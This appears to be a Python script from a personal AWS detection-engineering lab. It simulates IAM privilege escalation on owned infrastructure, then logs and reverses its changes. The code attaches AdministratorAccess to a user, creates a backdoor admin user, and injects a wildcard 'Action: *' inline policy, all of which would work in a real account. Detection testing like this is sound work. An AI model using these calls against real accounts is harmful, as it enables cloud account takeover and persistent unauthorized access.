import boto3
import json
import time
import os
from datetime import datetime, timezone
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from dotenv import load_dotenv

load_dotenv()
console = Console()

REGION = os.getenv('AWS_REGION', 'ap-south-1')
ACCOUNT_ID = "664858858896"
TARGET_USER = "Lalith"
BACKDOOR_USER = "lab-backdoor-user-test"

def simulate_privilege_escalation():
    """
    Simulates an attacker attempting to escalate privileges
    in an AWS account after gaining initial access.
    MITRE ATT&CK T1548 — Abuse Elevation Control Mechanism
    """

    console.print(Panel(
        "[bold red]ATTACK SIMULATION — Privilege Escalation[/bold red]\n"
        "[yellow]MITRE T1548 — Abuse Elevation Control Mechanism[/yellow]\n"
        "[white]Environment: Personal AWS Lab — Authorized Testing Only[/white]",
        border_style="red"
    ))

    results = {}
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")

    # Initialize clients
    iam = boto3.client('iam', region_name=REGION)
    sts = boto3.client('sts', region_name=REGION)

    # Step 1 — Check current identity and permissions
    console.print("\n[cyan]Step 1: Checking current identity and permissions...[/cyan]")
    time.sleep(1)

    try:
        identity = sts.get_caller_identity()
        results["identity"] = {
            "arn": identity["Arn"],
            "account": identity["Account"],
            "user_id": identity["UserId"]
        }
        console.print(f"[green]Current identity: {identity['Arn']}[/green]")

        # Check attached policies
        attached = iam.list_attached_user_policies(UserName=TARGET_USER)
        current_policies = [p["PolicyName"] for p in attached["AttachedPolicies"]]
        results["current_policies"] = current_policies
        console.print(f"[green]Current policies: {current_policies}[/green]")

    except Exception as e:
        console.print(f"[red]Step 1 failed: {str(e)}[/red]")
        results["identity"] = "access_denied"

    # Step 2 — Attempt to attach AdministratorAccess
    console.print("\n[cyan]Step 2: Attempting to attach AdministratorAccess policy...[/cyan]")
    console.print("[yellow]This is the most common privilege escalation technique in AWS[/yellow]")
    time.sleep(1)

    try:
        iam.attach_user_policy(
            UserName=TARGET_USER,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        results["attach_admin"] = "SUCCESS — CRITICAL ESCALATION"
        console.print("[red]AdministratorAccess ATTACHED — Full account compromise[/red]")

    except Exception as e:
        error_code = "AccessDenied" if "AccessDenied" in str(e) else "Error"
        results["attach_admin"] = f"BLOCKED — {error_code}"
        console.print(f"[green]Escalation blocked: {error_code}[/green]")
        console.print("[yellow]CloudTrail still logged this attempt[/yellow]")

    time.sleep(1)

    # Step 3 — Attempt to create backdoor admin user
    console.print("\n[cyan]Step 3: Attempting to create backdoor admin user...[/cyan]")
    time.sleep(1)

    backdoor_created = False

    try:
        iam.create_user(UserName=BACKDOOR_USER)
        backdoor_created = True
        results["create_backdoor"] = "SUCCESS — backdoor user created"
        console.print(f"[red]Backdoor user created: {BACKDOOR_USER}[/red]")

        # Try to attach admin to backdoor user
        try:
            iam.attach_user_policy(
                UserName=BACKDOOR_USER,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
            )
            results["backdoor_admin"] = "SUCCESS — backdoor has admin access"
            console.print("[red]AdministratorAccess attached to backdoor user[/red]")
        except Exception as e:
            results["backdoor_admin"] = f"BLOCKED — {str(e)[:50]}"
            console.print(f"[green]Admin attachment blocked[/green]")

    except Exception as e:
        error_code = "AccessDenied" if "AccessDenied" in str(e) else str(e)[:50]
        results["create_backdoor"] = f"BLOCKED — {error_code}"
        console.print(f"[green]Backdoor creation blocked: {error_code}[/green]")
        console.print("[yellow]CloudTrail logged this attempt[/yellow]")

    # Step 4 — Attempt inline policy injection
    console.print("\n[cyan]Step 4: Attempting inline policy injection...[/cyan]")
    time.sleep(1)

    try:
        iam.put_user_policy(
            UserName=TARGET_USER,
            PolicyName="escalation-test-policy",
            PolicyDocument=json.dumps({
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }]
            })
        )
        results["inline_policy"] = "SUCCESS — full access inline policy injected"
        console.print("[red]Inline policy injected — full access granted[/red]")

    except Exception as e:
        error_code = "AccessDenied" if "AccessDenied" in str(e) else str(e)[:50]
        results["inline_policy"] = f"BLOCKED — {error_code}"
        console.print(f"[green]Inline policy injection blocked: {error_code}[/green]")
        console.print("[yellow]CloudTrail logged this attempt[/yellow]")

    return results, timestamp, backdoor_created

def remediate(iam, backdoor_created):
    """
    Remediates any successful escalation attempts.
    Cleans up test resources created during simulation.
    """
    console.print("\n[cyan]Remediating privilege escalation attempts...[/cyan]")

    # Remove any accidentally attached admin policy
    try:
        iam.detach_user_policy(
            UserName=TARGET_USER,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        console.print("[green]AdministratorAccess detached from target user[/green]")
    except Exception as e:
        if "NoSuchEntity" in str(e):
            console.print("[green]AdministratorAccess was not attached — clean[/green]")
        else:
            console.print(f"[yellow]Detach check: {str(e)[:50]}[/yellow]")

    # Remove inline policy if created
    try:
        iam.delete_user_policy(
            UserName=TARGET_USER,
            PolicyName="escalation-test-policy"
        )
        console.print("[green]Inline escalation policy removed[/green]")
    except Exception as e:
        if "NoSuchEntity" in str(e):
            console.print("[green]No inline policy found — clean[/green]")
        else:
            console.print(f"[yellow]Inline policy check: {str(e)[:50]}[/yellow]")

    # Delete backdoor user if created
    if backdoor_created:
        try:
            # Must detach policies before deleting user
            try:
                iam.detach_user_policy(
                    UserName=BACKDOOR_USER,
                    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
                )
            except Exception:
                pass

            iam.delete_user(UserName=BACKDOOR_USER)
            console.print(f"[green]Backdoor user deleted: {BACKDOOR_USER}[/green]")
        except Exception as e:
            console.print(f"[red]Failed to delete backdoor user: {str(e)}[/red]")

    console.print("[green]Remediation complete[/green]")


def save_results(results, timestamp):
    """
    Saves attack results to JSON for documentation.
    """
    output_dir = "findings/reports"
    os.makedirs(output_dir, exist_ok=True)
    output_file = f"{output_dir}/scenario4_privilege_escalation_{timestamp}.json"

    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)

    console.print(f"\n[cyan]Results saved to: {output_file}[/cyan]")
    return output_file


def main():
    """
    Main function — orchestrates the full privilege escalation simulation.
    Check → Escalate → Document → Remediate
    """
    console.print(Panel(
        "[bold white]AWS Detection Engineering Lab[/bold white]\n"
        "[cyan]Scenario 4 — Privilege Escalation[/cyan]\n"
        "[yellow]All actions performed on owned infrastructure[/yellow]",
        border_style="cyan"
    ))

    # Initialize clients
    iam = boto3.client('iam', region_name=REGION)

    # Phase 1 — Attack
    console.print("\n[bold red]PHASE 1 — ATTACK SIMULATION[/bold red]")
    results, timestamp, backdoor_created = simulate_privilege_escalation()

    # Phase 2 — Document
    console.print("\n[bold cyan]PHASE 2 — DOCUMENTATION[/bold cyan]")

    summary_results = {
        "scenario": "Privilege Escalation",
        "mitre_technique": "T1548",
        "mitre_tactic": "Privilege Escalation",
        "target_user": TARGET_USER,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "attack_results": results,
        "guardduty_finding": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
        "cloudtrail_events": [
            "AttachUserPolicy",
            "CreateUser",
            "PutUserPolicy"
        ],
        "detection_rule": "DR-004 — Privilege Escalation Attempt"
    }

    output_file = save_results(summary_results, timestamp)

    # Phase 3 — Remediate
    console.print("\n[bold green]PHASE 3 — REMEDIATION[/bold green]")
    remediate(iam, backdoor_created)

    # Final summary
    console.print(Panel(
        f"[bold green]SIMULATION COMPLETE[/bold green]\n"
        f"[white]Target user: {TARGET_USER}[/white]\n"
        f"[white]Admin attach attempt: {results.get('attach_admin', 'N/A')}[/white]\n"
        f"[white]Backdoor creation: {results.get('create_backdoor', 'N/A')}[/white]\n"
        f"[white]Inline policy attempt: {results.get('inline_policy', 'N/A')}[/white]\n"
        f"[white]Evidence saved: {output_file}[/white]\n"
        f"[yellow]All attempts logged to CloudTrail[/yellow]\n"
        f"[yellow]Check GuardDuty for IAM findings[/yellow]\n"
        f"[green]Environment remediated — clean[/green]",
        border_style="green"
    ))


if __name__ == "__main__":
    main()

    